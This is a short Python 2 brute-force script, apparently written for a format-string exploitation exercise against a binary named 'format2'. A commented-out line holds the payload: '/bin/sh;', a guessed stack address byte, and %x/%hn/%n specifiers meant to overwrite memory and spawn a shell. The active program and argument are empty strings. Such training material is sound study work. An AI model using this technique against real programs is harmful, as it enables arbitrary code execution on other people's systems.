import subprocess
import struct

for i in xrange(1, 255):
 print i

 ### arg = "/bin/sh;" + struct.pack('B', i) + "\xd6\xff\xff" + "\x90"*4 + "\x01\xa0\x04\x08" + "%x"*10 + "%hn" + "%134513561d" + "%n"
 ### program = "./format2"
 arg = ""
 program = ""

 output = subprocess.Popen([program, arg])
 output.communicate()
